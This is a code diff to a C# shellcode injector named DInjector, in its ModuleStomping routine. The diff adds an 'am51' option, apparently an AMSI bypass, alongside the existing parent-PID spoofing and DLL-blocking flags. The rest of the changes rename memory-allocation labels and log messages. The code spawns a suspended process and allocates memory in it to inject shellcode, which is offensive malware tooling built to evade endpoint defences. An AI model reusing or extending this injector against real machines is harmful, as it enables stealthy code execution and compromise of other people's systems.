@@ -32,7 +32,7 @@ namespace DInjector
             };
         }
 
-        public static void Execute(byte[] shellcode, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false)
+        public static void Execute(byte[] shellcode, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false, bool am51 = false)
         {
             #region CreateProcessA
 
@@ -41,7 +41,8 @@ namespace DInjector
                 @"C:\Windows\System32",
                 suspended: true,
                 ppid: ppid,
-                blockDlls: blockDlls);
+                blockDlls: blockDlls,
+                am51: am51);
 
             #endregion
 
@@ -55,7 +56,7 @@ namespace DInjector
 
             #endregion
 
-            #region NtAllocateVirtualMemory (bModuleName, PAGE_READWRITE)
+            #region NtAllocateVirtualMemory (bModuleNameLength, PAGE_READWRITE)
 
             IntPtr hProcess = pi.hProcess;
             var allocModule = IntPtr.Zero;
@@ -70,13 +71,13 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (bModuleName), PAGE_READWRITE");
+                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (bModuleNameLength), PAGE_READWRITE");
             else
-                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (bModuleName), PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (bModuleNameLength), PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
-            #region NtAllocateVirtualMemory (shim, PAGE_READWRITE)
+            #region NtAllocateVirtualMemory (shimLength, PAGE_READWRITE)
 
             var allocShim = IntPtr.Zero;
             regionSize = new IntPtr(shim.Length);
@@ -90,9 +91,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (shim), PAGE_READWRITE");
+                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (shimLength), PAGE_READWRITE");
             else
-                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (shim), PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (shimLength), PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
